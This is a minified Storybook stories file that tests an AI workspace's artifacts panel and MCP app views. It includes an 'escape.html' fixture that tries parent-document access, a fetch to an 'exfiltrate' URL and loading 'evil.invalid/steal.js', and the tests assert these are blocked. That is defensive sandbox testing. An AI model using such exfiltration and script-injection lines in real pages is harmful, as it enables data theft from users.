import{j as o,b_ as B,aK as A,b$ as Pe,c0 as Re,c1 as Ne,W as he}from"./iframe-DwmVy7SQ.js";import{c as w}from"./orpc-sAt07-6s.js";import{P as m}from"./meta-CT6GdK4g.js";import{A as b,a as Ye}from"./RightSidebar-BQa1W4kD.js";import"./preload-helper-PPVm8Dsz.js";import"./workspace-D5uypDf7.js";import"./autoModelRouting-DEovgEig.js";import"./workspaceActionHandlers-B07ZFgJK.js";import"./pin-B7bBByyx.js";import"./AgentListItem-CDHdwnLa.js";import"./useWorkspaceStreamingStatusPhase-BkhDeBLo.js";import"./shield-BJlRjF-1.js";import"./AIView-Cw4ZT1Fh.js";import"./shell-NsnPoeBt.js";import"./useTranscriptContextMenu-BlHqP5bS.js";import"./ConfirmationModal-C1groiNk.js";import"./slashCommandHints-BSKyjYjN.js";import"./ToggleGroup-ZY8y6PCJ.js";import"./sendDispatchModes-BJ8PBEam.js";import"./timelineReveal-HqQYIr77.js";import"./TerminalRouterContext-3wrzl_rm.js";import"./ForceDeleteModal-D-zrU_Xr.js";import"./PlanFileDialog-XDIy4dKd.js";import"./diffParser-DYf5q3Bd.js";import"./TimelinePanel-B7hLQBAD.js";const{expect:n,userEvent:p,waitFor:i,within:r}=__STORYBOOK_MODULE_TEST__;function ze(e){const t=he.useRef(window.api);return e.browserMode?delete window.api:window.api={platform:"linux",versions:{},getIsRosetta:()=>Promise.resolve(!1)},he.useEffect(()=>{const a=t.current;return()=>{window.api=a}},[]),o.jsx(o.Fragment,{children:e.children})}const Rt={title:"Features/RightSidebar/ArtifactsPanel",component:b,decorators:[(e,t)=>o.jsx(ze,{browserMode:t.parameters.browserMode===!0,children:o.jsx("div",{"data-workspace-shell":"",children:o.jsx(e,{})})})],parameters:{layout:"fullscreen",viewport:{options:{phone390:{name:"Phone 390",styles:{width:"390px",height:"844px"},type:"mobile"},laptop1200:{name:"Laptop 1200",styles:{width:"1200px",height:"900px"},type:"desktop"}}}}},h="ws-story-artifacts",De="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",Qe=["# Weekly report","","Throughput rose **18%** after the queue change. The chart below is a relative image link,","read from the artifact's folder.","","![Throughput by service](img/chart.png)","","| Service | p95 (ms) |","| ------- | -------- |","| api     | 142      |","| worker  | 388      |","","- Queue depth is stable","- Retries dropped to `0.4%`"].join(`
`),Ue=JSON.stringify({$xum:"table",columns:["service","requests","p95_ms","healthy"],rows:[{service:"api",requests:182340,p95_ms:142,healthy:!0},{service:"worker",requests:40211,p95_ms:388,healthy:!0},{service:"billing",requests:9120,p95_ms:912,healthy:!1},{service:"search",requests:66012,p95_ms:205,healthy:!0}]},null,2),$e=["region,quarter,revenue,note",'us-east,Q1,1204000,"Includes ""launch"" promo"',"us-west,Q1,980500,",'eu-central,Q1,1100230,"Multi-line','note"',"ap-south,Q1,402100,Ragged row,extra"].join(`\r
`),Xe=`<!doctype html>
<html>
<head>
<style>
  body { font-family: system-ui, sans-serif; margin: 0; padding: 16px; background: #0f172a; color: #e2e8f0; }
  h1 { font-size: 18px; margin: 0 0 12px; }
  .bars { display: flex; gap: 8px; align-items: flex-end; height: 140px; }
  .bar { flex: 1; background: linear-gradient(#38bdf8, #6366f1); border-radius: 4px 4px 0 0; }
  p { font-size: 13px; color: #94a3b8; }
</style>
</head>
<body>
  <h1>Sandboxed HTML artifact</h1>
  <div class="bars">
    <div class="bar" style="height:40%"></div><div class="bar" style="height:75%"></div>
    <div class="bar" style="height:55%"></div><div class="bar" style="height:90%"></div>
  </div>
  <p id="theme"></p>
  <script>
    document.getElementById("theme").textContent = "Host theme: " + window.xum.theme;
  <\/script>
</body>
</html>`,Me=`diff --git a/src/queue.ts b/src/queue.ts
index 3b18e51..a9c2f04 100644
--- a/src/queue.ts
+++ b/src/queue.ts
@@ -10,6 +10,9 @@ export class Queue {
   private items: Job[] = [];
 
-  push(job: Job) {
-    this.items.push(job);
+  push(job: Job): void {
+    if (this.items.length >= this.limit) {
+      throw new Error("queue full");
+    }
+    this.items.push(job);
   }
 }
`;function d(e,t,a="utf8"){return{status:"ok",path:e,kind:Pe(e),size:t.length,modifiedMs:1,encoding:a,content:t}}const u={"report.md":d("report.md",Qe),"img/chart.png":d("img/chart.png",De,"base64"),"services.json":d("services.json",Ue),"revenue.csv":d("revenue.csv",$e),"dashboard.html":d("dashboard.html",Xe),"queue.diff":d("queue.diff",Me)};function v(e){return{available:!0,dir:"/scratch/artifacts",entries:Object.values(e).map((a,s)=>({path:a.path,kind:a.kind,size:a.size,modifiedMs:100-s})),truncated:!1}}function l(e,t=u,a={}){const s=a.workspaceId??h;return B(s,{scope:"artifact",path:e,version:null}),o.jsx(A,{client:w({artifacts:{listing:v(t),files:t,sendInteractionError:a.sendInteractionError},userPreferences:{ui:{artifactsAllowCdnScripts:a.allowCdn??!0}}}),children:o.jsx("div",{className:"bg-background flex h-screen justify-end",children:o.jsx("div",{className:"bg-sidebar border-border-light h-full w-full max-w-[440px] border-l",children:o.jsx(b,{workspaceId:s})})})})}const g={globals:{viewport:{value:"phone390",isRotated:!1}},parameters:{pixel:m}},y={globals:{viewport:{value:"laptop1200",isRotated:!1}},parameters:{pixel:m}},E=async e=>{const t=r(e);await t.findByRole("heading",{name:"Weekly report"});const a=await t.findByRole("img",{name:"Throughput by service"});await i(()=>n(a.getAttribute("src")).toMatch(/^data:image\/png;base64,/))},xe=async e=>{const t=r(e);await t.findByRole("columnheader",{name:"p95_ms"}),await t.findByRole("cell",{name:"billing"})},Be=async e=>{await r(e).findByRole("cell",{name:'Includes "launch" promo'})},Ae=async e=>{const t=await r(e).findByTestId("artifact-frame");await n(t.getAttribute("sandbox")).toBe("allow-scripts")},be=async e=>{const t=r(e),a=await t.findByRole("img",{name:"img/chart.png"});await i(()=>n(a.naturalWidth).toBe(480)),await p.click(t.getByRole("button",{name:"Actual size (100%)"})),await p.click(t.getByRole("button",{name:"Zoom in"})),await t.findByText(/125%/)},Ee=async e=>{await r(e).findByText("src/queue.ts")},fe=[{path:"report.md",ready:E},{path:"services.json",ready:xe},{path:"revenue.csv",ready:Be},{path:"dashboard.html",ready:Ae},{path:"img/chart.png",ready:be},{path:"queue.diff",ready:Ee}],M={...g,render:()=>l("report.md"),play:({canvasElement:e})=>E(e)},T={...y,render:()=>l("report.md"),play:({canvasElement:e})=>E(e)},L={...g,render:()=>l("services.json"),play:({canvasElement:e})=>xe(e)},j={...y,render:()=>l("services.json"),play:({canvasElement:e})=>xe(e)},G={...g,render:()=>l("revenue.csv"),play:({canvasElement:e})=>Be(e)},W={...y,render:()=>l("revenue.csv"),play:({canvasElement:e})=>Be(e)},F={...g,render:()=>l("dashboard.html"),play:({canvasElement:e})=>Ae(e)},k={parameters:{pixel:m,browserMode:!0},render:()=>l("dashboard.html"),play:async({canvasElement:e})=>{await Ae(e),await r(e).findByRole("button",{name:"Annotate"})}},_={...y,render:()=>l("dashboard.html"),play:({canvasElement:e})=>Ae(e)},O={...g,render:()=>l("img/chart.png"),play:({canvasElement:e})=>be(e)},q={...y,render:()=>l("img/chart.png"),play:({canvasElement:e})=>be(e)},V={...g,render:()=>l("queue.diff"),play:({canvasElement:e})=>Ee(e)},J={...y,render:()=>l("queue.diff"),play:({canvasElement:e})=>Ee(e)};function Te(){for(const e of fe)B(`${h}-${e.path}`,{scope:"artifact",path:e.path,version:null});return o.jsx(A,{client:w({artifacts:{listing:v(u),files:u}}),children:o.jsx("div",{className:"bg-background grid grid-cols-1 gap-2 p-2 min-[1000px]:grid-cols-3",children:fe.map(e=>o.jsx("div",{"data-gallery-cell":e.path,className:"bg-sidebar border-border-light h-[420px] min-w-0 border",children:o.jsx(b,{workspaceId:`${h}-${e.path}`})},e.path))})})}async function Le(e){for(const t of fe){const a=e.querySelector(`[data-gallery-cell="${t.path}"]`);await n(a).not.toBeNull(),await t.ready(a)}}const K={globals:{viewport:{value:"phone390",isRotated:!1}},parameters:{pixel:{matrix:{themes:["dark","light"],viewports:["phone"]}}},render:Te,play:({canvasElement:e})=>Le(e)},H={globals:{viewport:{value:"laptop1200",isRotated:!1}},parameters:{pixel:{matrix:{themes:["dark","light"],viewports:["laptop"]}}},render:Te,play:({canvasElement:e})=>Le(e)},Ze=JSON.stringify({$xum:"canvas",blocks:[{type:"markdown",text:"# Q3 service review\n\nLatency held steady while traffic grew. Numbers below come from `data/throughput.json`."},{type:"stat",label:"Requests",value:"297k",delta:"+18% vs Q2"},{type:"stat",label:"p95 latency",value:"142 ms",delta:"-6 ms"},{type:"stat",label:"Error rate",value:"0.4%"},{type:"chart",kind:"bar",title:"Requests by service (inline data)",data:[{service:"api",requests:182340},{service:"worker",requests:40211},{service:"search",requests:66012},{service:"billing",requests:9120}],x:"service",y:"requests"},{type:"chart",kind:"line",title:"Weekly throughput (data/throughput.json)",data:"data/throughput.json#/series",x:"week",y:["api","worker"]},{type:"table",columns:["service","owner","status"],rows:[{service:"api",owner:"platform",status:"healthy"},{service:"billing",owner:"payments",status:"degraded after the 2026-09-14 deploy"},["search","discovery","healthy"]]},{type:"diff",patch:Me},{type:"image",src:"img/chart.png",alt:"Throughput chart"},{type:"button",label:"Draft the Q4 plan",send:"Draft a Q4 plan from this review.",data:{quarter:"Q3"}},{type:"widget",note:"a type this renderer does not know"}]},null,2),ge={"q3.canvas.json":d("q3.canvas.json",Ze),"data/throughput.json":d("data/throughput.json",JSON.stringify({series:[{week:"W1",api:12.1,worker:3.2},{week:"W2",api:13.4,worker:3.1},{week:"W3",api:12.8,worker:3.9},{week:"W4",api:15.2,worker:4.4},{week:"W5",api:16,worker:4.1}]})),"img/chart.png":u["img/chart.png"]},C={parameters:{pixel:{matrix:{themes:["dark","light"],viewports:["phone","laptop"]}}},render:()=>o.jsx(A,{client:w({artifacts:{listing:v(ge),files:ge}}),children:o.jsx("div",{className:"bg-background flex justify-end",children:o.jsx("div",{className:"bg-sidebar border-border-light w-full max-w-[440px] min-w-0 border-l",children:o.jsx(Ye,{result:ge["q3.canvas.json"],workspaceId:h,interactions:{requestSend:()=>{}}})})})}),play:async({canvasElement:e})=>{const t=r(e);await t.findByRole("heading",{name:"Q3 service review"}),await t.findByText("Unsupported block: widget"),await t.findByRole("button",{name:"Draft the Q4 plan"});const a=await t.findByRole("img",{name:"Throughput chart"});await i(()=>n(a.getAttribute("src")).toMatch(/^data:image\/png;base64,/)),await i(()=>n(e.querySelectorAll(".recharts-wrapper").length).toBe(2))}},et=JSON.stringify({$xum:"canvas",blocks:[{type:"markdown",text:`# Rollout options

Plan B ships the cache behind a flag and keeps the old path for a week.`},{type:"stat",label:"Risk",value:"Low",delta:"-2 vs plan A"},{type:"button",label:"Approve plan B",send:"Approve plan B.",data:{plan:"B"}}]}),I={parameters:{pixel:{matrix:{themes:["dark","light"],viewports:["phone","laptop"]}}},render:()=>l("rollout.canvas.json",{"rollout.canvas.json":d("rollout.canvas.json",et)},{sendInteractionError:"Workspace not found: story"}),play:async({canvasElement:e})=>{const t=r(e);await p.click(await t.findByRole("button",{name:"Approve plan B"}));const a=await t.findByTestId("artifact-send-strip");await r(a).findByText("Approve plan B."),await r(a).findByText("Workspace not found: story");const s=r(a).getByRole("button",{name:"Send"});await i(()=>n(s).toBeEnabled(),{timeout:5e3}),await p.click(t.getByRole("button",{name:"Annotate"})),await t.findByText("Annotating: select text to comment on it.");const c=await t.findByText(/Plan B ships the cache/),x=c.firstChild,S=e.ownerDocument.createRange();S.setStart(x,0),S.setEnd(x,22);const Q=e.ownerDocument.getSelection();Q.removeAllRanges(),Q.addRange(S),c.dispatchEvent(new MouseEvent("mouseup",{bubbles:!0}));const He=await t.findByTestId("artifact-annotation-popover");await r(He).findByText("“Plan B ships the cache”")}};function tt(){const e=`${h}-versions`;B(e,{scope:"artifact",path:"report.md",version:null});const t=Date.now(),a=c=>t-c*6e4,s={sha256:"sha",size:Qe.length,path:"report.md"};return o.jsx(A,{client:w({artifacts:{listing:v(u),files:u,versions:{"report.md":[{...s,version:3,label:"Weekly report, final",source:"publish",createdAtMs:a(4)},{...s,version:2,label:null,source:"turn-end",createdAtMs:a(95)},{...s,version:1,label:"First draft",source:"publish",createdAtMs:a(1560)}]}}}),children:o.jsx("div",{className:"bg-background flex h-screen justify-end",children:o.jsx("div",{className:"bg-sidebar border-border-light h-full w-full max-w-[440px] border-l",children:o.jsx(b,{workspaceId:e})})})})}const Y={parameters:{pixel:{matrix:{themes:["dark","light"],viewports:["laptop"]}}},render:tt,play:async({canvasElement:e})=>{await E(e);const t=r(e);await p.click(await t.findByRole("button",{name:"Version: Latest (live)"}));const a=await t.findByRole("menu",{name:"Artifact versions"});await r(a).findByText("Turn snapshot")}};function je(){const e=`${h}-shelf`;B(e,{scope:"artifact",path:"report.md",version:null});const t=Date.now(),a=(s,c,x,S,Q)=>({scope:s,name:c,file:c,title:x,kind:Pe(c),size:2048,version:2,sourceWorkspaceId:"ws-other",sourcePath:c,pinnedAtMs:t-Q*6e4,pinnedBy:S});return o.jsx(A,{client:w({artifacts:{listing:v(u),files:u,shelf:{project:{available:!0,entries:[a("project","migration-plan.md","migration plan","agent",12),a("project","schema.svg","schema diagram","user",300)]},global:[a("global","style-guide.html","style guide","user",1800)]}}}),children:o.jsx("div",{className:"bg-background flex h-screen justify-end",children:o.jsx("div",{className:"bg-sidebar border-border-light h-full w-full max-w-[440px] border-l",children:o.jsx(b,{workspaceId:e})})})})}const Ge=async e=>{await E(e),await p.click(r(e).getByRole("combobox",{name:"Artifact"}));const t=await r(document.body).findByRole("listbox");await r(t).findByText("Shelf"),await r(t).findByText("project · pinned by agent"),await r(t).findByText("global · pinned by you")},z={parameters:{pixel:{matrix:{themes:["dark","light"],viewports:["phone"]}}},globals:{viewport:{value:"phone390",isRotated:!1}},render:je,play:({canvasElement:e})=>Ge(e)},U={parameters:{pixel:{matrix:{themes:["dark","light"],viewports:["laptop"]}}},render:je,play:({canvasElement:e})=>Ge(e)};function We(){const e=`${h}-other-files`;B(e,{scope:"artifact",path:null,version:null});const t={};for(let s=1;s<=11;s++){const c=`img/step-${String(s).padStart(2,"0")}.png`;t[c]=d(c,De,"base64")}t["img/chart.png"]=u["img/chart.png"],t["report.md"]=u["report.md"];const a=v(t);return a.available&&(a.versionedPaths=["report.md"]),o.jsx(A,{client:w({artifacts:{listing:a,files:t}}),children:o.jsx("div",{className:"bg-background flex h-screen justify-end",children:o.jsx("div",{className:"bg-sidebar border-border-light h-full w-full max-w-[440px] border-l",children:o.jsx(b,{workspaceId:e})})})})}const Fe=async e=>{await E(e);const t=r(e).getByRole("combobox",{name:"Artifact"});await p.click(t);const a=await r(document.body).findByRole("listbox");await r(a).findByText("Other files");const s=await r(a).findByRole("option",{name:"Show 12 other files"});await n(r(a).queryByRole("option",{name:"img/step-01.png"})).toBeNull(),await p.keyboard("{ArrowDown}"),await i(()=>n(document.activeElement).toBe(s)),await p.keyboard("{Enter}"),await r(a).findByRole("option",{name:"img/step-01.png"}),await n(r(document.body).getByRole("listbox")).toBe(a),await p.click(r(a).getByRole("option",{name:"Hide other files"})),await r(a).findByRole("option",{name:"Show 12 other files"}),await n(r(a).queryByRole("option",{name:"img/step-01.png"})).toBeNull(),await n(r(document.body).getByRole("listbox")).toBe(a),await n(t.textContent).toContain("report.md")},$={parameters:{pixel:{matrix:{themes:["dark","light"],viewports:["phone"]}}},globals:{viewport:{value:"phone390",isRotated:!1}},render:We,play:({canvasElement:e})=>Fe(e)},X={parameters:{pixel:{matrix:{themes:["dark","light"],viewports:["laptop"]}}},render:We,play:({canvasElement:e})=>Fe(e)},_e=`<!doctype html>
<html><head>
<script>
  var results = { violations: [] };
  document.addEventListener("securitypolicyviolation", function (e) {
    results.violations.push({ directive: e.effectiveDirective, blocked: String(e.blockedURI) });
  });
  function attempt(fn) { try { fn(); return "allowed"; } catch (e) { return "blocked:" + e.name; } }
  results.parentDocument = attempt(function () { return parent.document.body.innerHTML.length; });
  results.localStorage = attempt(function () { return window.localStorage.getItem("x"); });
  results.topNavigation = attempt(function () { top.location.href = "https://example.com/escaped"; });
  var fetched = fetch("https://example.com/exfiltrate").then(
    function () { return "allowed"; },
    function (e) { return "blocked:" + e.name; }
  );
  window.addEventListener("load", function () {
    fetched.then(function (fetchResult) {
      setTimeout(function () {
        results.fetch = fetchResult;
        results.chartLoaded = typeof window.Chart === "function";
        parent.postMessage({ xumEscapeTest: results }, "*");
      }, 300);
    });
  });
<\/script>
<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.1/dist/chart.umd.min.js"><\/script>
<script src="https://evil.invalid/steal.js"><\/script>
</head><body><p>escape test</p></body></html>`;let ue=null;const Oe=()=>{ue=null;const e=t=>{const a=t.data;a?.xumEscapeTest!=null&&(ue=a.xumEscapeTest)};return window.addEventListener("message",e),()=>window.removeEventListener("message",e)};async function qe(e){const t=window.location.href;await i(()=>n(ue).not.toBeNull(),{timeout:15e3});const a=ue;await n(a.parentDocument).toMatch(/^blocked/),await n(a.localStorage).toMatch(/^blocked/),await n(a.fetch).toMatch(/^blocked/),await n(a.topNavigation).not.toBe("allowed"),await n(window.location.href).toBe(t);const s=c=>a.violations.some(x=>x.blocked.includes(c));await n(s("evil.invalid")).toBe(!0),await n(s("example.com")).toBe(!0),await n(s("cdn.jsdelivr.net")).toBe(!e),e||await n(a.chartLoaded).toBe(!1)}const Z={parameters:{pixel:m},beforeEach:Oe,render:()=>l("escape.html",{"escape.html":d("escape.html",_e)}),play:()=>qe(!0)},ee={parameters:{pixel:m},beforeEach:Oe,render:()=>l("escape.html",{"escape.html":d("escape.html",_e)},{allowCdn:!1}),play:()=>qe(!1)},Ce="data:text/html,<p>navigated</p>",Se=e=>`<!doctype html><html><head><script>
  window.addEventListener("load", function () {
    ${e==="location"?`location.href = ${JSON.stringify(Ce)};`:'document.getElementById("away").click();'}
  });
<\/script></head><body><a id="away" href="${Ce}">away</a></body></html>`,Ve=async e=>{const t=r(e);await t.findByText(/This artifact navigated away/,void 0,{timeout:1e4}),await n(t.queryByTestId("artifact-frame")).toBeNull(),await n(t.getByRole("button",{name:"Reload"})).toBeTruthy()},te={parameters:{pixel:m},render:()=>l("away.html",{"away.html":d("away.html",Se("location"))}),play:({canvasElement:e})=>Ve(e)},ae={parameters:{pixel:m},render:()=>l("away.html",{"away.html":d("away.html",Se("link"))}),play:({canvasElement:e})=>Ve(e)},at=`<!doctype html><html><head><script>
  window.addEventListener("message", function (event) {
    if (!event.data || event.data.xumBridgeTest !== "press-escape") return;
    window.dispatchEvent(new KeyboardEvent("keydown", { key: "Escape", bubbles: true }));
    parent.postMessage({ xumBridgeTest: "sent-escape" }, "*");
  });
  window.addEventListener("load", function () {
    parent.postMessage({ xumBridgeTest: "ready" }, "*");
  });
<\/script></head><body><p>bridge test</p></body></html>`,P=[],ne={parameters:{pixel:m},beforeEach:()=>{P.length=0;const e=t=>{const a=t.data?.xumBridgeTest;typeof a=="string"&&P.push(a)};return window.addEventListener("message",e),()=>window.removeEventListener("message",e)},render:()=>l("bridge.html",{"bridge.html":d("bridge.html",at)},{workspaceId:`${h}-bridge`}),play:async({canvasElement:e})=>{const t=r(e),a=await t.findByTestId("artifact-frame");if(!(a instanceof HTMLIFrameElement))throw new Error("Story bug: no artifact iframe");await i(()=>n(P).toContain("ready")),await p.click(t.getByRole("button",{name:"Fullscreen"})),await i(()=>n(e.ownerDocument.querySelector('[data-testid="artifacts-panel"][aria-label]')).not.toBeNull()),await n(t.getByTestId("artifact-frame")).toBe(a),await n(P.filter(s=>s==="ready")).toHaveLength(1),a.contentWindow?.postMessage({xumBridgeTest:"press-escape"},"*"),await i(()=>n(P).toContain("sent-escape"),{timeout:1e4}),await i(()=>n(e.ownerDocument.querySelector('[data-testid="artifacts-panel"][aria-label]')).toBeNull())}},Ie=`${h}-fullscreen-swap`,re={parameters:{pixel:m},render:()=>l("tree.json",{"tree.json":d("tree.json",'{"runs":[1,2]}'),"notes.txt":d("notes.txt","notes")},{workspaceId:Ie}),play:async({canvasElement:e})=>{const t=r(e);await t.findByRole("button",{name:/^runs:/}),await p.click(t.getByRole("button",{name:"Fullscreen"}));const a=await t.findByLabelText("Artifact tree.json"),s=r(a).getByRole("button",{name:/^runs:/});s.focus(),await n(s).toHaveFocus(),B(Ie,{scope:"artifact",path:"notes.txt"}),await i(()=>n(s.isConnected).toBe(!1)),await i(()=>n(a).toHaveFocus()),await p.keyboard("{Escape}"),await i(()=>n(t.queryByLabelText("Artifact tree.json")).toBeNull())}},ye="call-weather-1",D=`<!doctype html>
<html>
<head>
<style>
  body { font-family: system-ui, sans-serif; margin: 0; padding: 16px; color: #0f172a; }
  h1 { font-size: 16px; margin: 0 0 8px; }
  li { font-size: 13px; }
</style>
</head>
<body>
  <h1>Weather view</h1>
  <ul id="log"></ul>
  <script>
    const seen = {};
    let nextId = 1;
    const pending = new Map();
    const log = (text) => {
      const li = document.createElement("li");
      li.textContent = text;
      document.getElementById("log").appendChild(li);
    };
    const send = (message) => window.parent.postMessage(message, "*");
    const request = (method, params) =>
      new Promise((resolve, reject) => {
        const id = nextId++;
        pending.set(id, { resolve, reject });
        send({ jsonrpc: "2.0", id, method, params });
      });
    const notify = (method, params) => send({ jsonrpc: "2.0", method, params });
    const maybeReady = () => {
      if (!(seen.init && seen.input && seen.result) || seen.sized) return;
      seen.sized = true;
      notify("ui/notifications/size-changed", { width: 400, height: 321 });
      request("tools/call", { name: "get_forecast", arguments: { city: "Berlin" } }).then(
        (result) => {
          log("Forecast: " + result.content[0].text);
          notify("ui/notifications/size-changed", { width: 400, height: 333 });
        },
        (error) => log("tools/call failed: " + error.message)
      );
    };
    window.addEventListener("message", (event) => {
      const message = event.data;
      if (message.id !== undefined && pending.has(message.id)) {
        const entry = pending.get(message.id);
        pending.delete(message.id);
        if (message.error) entry.reject(message.error);
        else entry.resolve(message.result);
        return;
      }
      if (message.method === "ui/resource-teardown") {
        send({ jsonrpc: "2.0", id: message.id, result: {} });
      } else if (message.method === "ui/notifications/tool-input") {
        seen.input = true;
        log("Input: " + JSON.stringify(message.params.arguments));
      } else if (message.method === "ui/notifications/tool-result") {
        seen.result = true;
        log("Result: " + message.params.content[0].text);
      }
      maybeReady();
    });
    request("ui/initialize", {
      protocolVersion: "2026-01-26",
      appInfo: { name: "weather-view", version: "1.0.0" },
      appCapabilities: {},
    }).then((result) => {
      seen.init = true;
      log("Host theme: " + result.hostContext.theme);
      notify("ui/notifications/initialized", {});
      maybeReady();
    });
  <\/script>
</body>
</html>`;function nt(e){const t=he.useRef(window.api);return window.api={platform:"linux",versions:{node:"20.0.0",chrome:"120.0.0",electron:"28.0.0"},getIsRosetta:()=>Promise.resolve(!1)},he.useEffect(()=>{const a=t.current;return()=>{window.api=a}},[]),o.jsx(o.Fragment,{children:e.children})}function f(e=D,t={resourceDomains:["http://tiles.example.com"]},a){return Re(h,{toolCallId:ye,serverName:"weather",resourceUri:"ui://weather/view.html",toolName:"show_weather",label:"Show weather",arguments:{city:"Berlin"},cancelled:!1,failed:!1}),o.jsx(A,{client:w({artifacts:{listing:v(u),files:u},mcpApps:{views:{[ye]:{html:e,csp:t,prefersBorder:null,resultAvailable:!0,result:{content:[{type:"text",text:"Berlin: 18°C, light rain"}]},approvalProjectPath:"/repo",invocation:{serverName:"weather",toolName:"show_weather",arguments:{city:"Berlin"}}}},callTool:s=>s.consented?{status:"ok",result:{content:[{type:"text",text:"Sunny tomorrow"}]}}:{status:"consent_required"},approveViewDomainsError:a}}),children:o.jsx(nt,{children:o.jsx("div",{className:"bg-background flex h-screen justify-end",children:o.jsx("div",{className:"bg-sidebar border-border-light h-full w-full max-w-[440px] border-l",children:o.jsx(Ne,{workspaceId:h,toolCallId:ye,onClose:()=>{}})})})})})}const Je=async e=>{const t=r(e),a=await t.findByTestId("mcp-app-frame");await n(a.getAttribute("sandbox")).toBe("allow-scripts"),await t.findByText(/Not granted to this view: http:\/\/tiles\.example\.com/),await i(()=>n(a.style.height).toBe("321px"),{timeout:5e3});const s=await t.findByRole("alert");await n(s.textContent).toContain("Allow get_forecast from weather?");const c=r(s).getByRole("button",{name:"Allow"});await i(()=>n(c).toBeEnabled(),{timeout:5e3}),await p.click(c),await i(()=>n(a.style.height).toBe("333px"),{timeout:5e3})},se={...y,render:()=>f(),play:({canvasElement:e})=>Je(e)},oe={...g,render:()=>f(),play:({canvasElement:e})=>Je(e)},R={...y,render:()=>f(),play:async({canvasElement:e})=>{const t=r(e),a=await t.findByTestId("mcp-app-frame"),s=t.getByTestId("app-view-tab-panel"),c=s.getBoundingClientRect().width;await p.click(t.getByRole("button",{name:"Maximize view"})),await i(()=>n(s.getBoundingClientRect().width).toBe(window.innerWidth)),await n(t.getByTestId("mcp-app-frame")).toBe(a),await p.click(t.getByRole("button",{name:"Restore view"})),await i(()=>n(s.getBoundingClientRect().width).toBe(c)),await n(t.getByTestId("mcp-app-frame")).toBe(a)}},me="call-weather-reload",ve={};function rt(){return delete ve[me],Re(h,{toolCallId:me,serverName:"weather",resourceUri:"ui://weather/view.html",toolName:"show_weather",label:"Show 